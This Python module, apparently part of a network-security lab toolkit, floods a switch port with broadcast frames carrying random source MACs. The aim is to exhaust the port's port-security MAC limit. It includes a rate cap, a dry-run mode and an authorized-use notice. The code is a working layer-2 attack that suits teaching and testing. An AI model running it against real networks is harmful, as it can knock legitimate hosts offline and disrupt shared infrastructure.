"""Port security exhaustion: uses up a port's MAC address limit with fake sources.

Each frame carries a new random source MAC and is sent from one port. A switch port with
a maximum MAC count learns each address until the limit is reached, and then its violation
action applies. The legitimate host on that port may lose connectivity.

Whether the limit is reached, and what the switch does then, depends on the switch and
cannot be reproduced on a Linux bridge, which has no per-port MAC limit. The lab measures
what the sender controls: how many distinct addresses the attacker's port learns, and that
the legitimate host's entry on its own port is kept.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, random_mac

MAX_RATE = 100.0           # frames per second; higher rates are refused
BATCH_SECONDS = 0.1        # frames are sent in batches this long
EXPERIMENTAL_ETHERTYPE = 0x88B5   # IEEE 802 local experimental EtherType
PAYLOAD = b"MACabre port security exhaustion probe"


@dataclass(frozen=True)
class PortSecurityExhaustionConfig:
    iface: str                  # attacker interface on the port under test
    rate: float = 10.0          # frames per second, each with a new source MAC
    count: int = 0              # frames to send in total; 0 = run until stopped
    dry_run: bool = False       # build frames but do not send them

    def __post_init__(self) -> None:
        if not 0 < self.rate <= MAX_RATE:
            raise ValueError(f"Rate must be between 0 and {MAX_RATE:g} frames per second.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")


@dataclass
class PortSecurityExhaustionStats:
    frames: int = 0
    status: str = ""


def exhaustion_frames(rng: random.Random, how_many: int) -> list[Packet]:
    """Broadcast frames, each with a new random source MAC."""
    return [
        Ether(src=random_mac(rng), dst=BROADCAST_MAC, type=EXPERIMENTAL_ETHERTYPE) / Raw(PAYLOAD)
        for _ in range(how_many)
    ]


def run_port_security_exhaustion(
    config: PortSecurityExhaustionConfig,
    stop_event: threading.Event,
    on_progress: Callable[[PortSecurityExhaustionStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> PortSecurityExhaustionStats:
    """Send frames with new source MACs at `rate` per second until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = PortSecurityExhaustionStats(
            status=(
                f"Dry run: would send about {config.rate:g} frames per second, each with a new "
                f"source MAC, from this port. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    per_batch = max(1, round(config.rate * BATCH_SECONDS))
    stats = PortSecurityExhaustionStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        batch = per_batch
        if config.count:
            batch = min(batch, config.count - stats.frames)
        send(exhaustion_frames(rng, batch), iface=config.iface, verbose=False)
        stats.frames += batch
        on_progress(replace(stats))
        stop_event.wait(BATCH_SECONDS)
    return stats
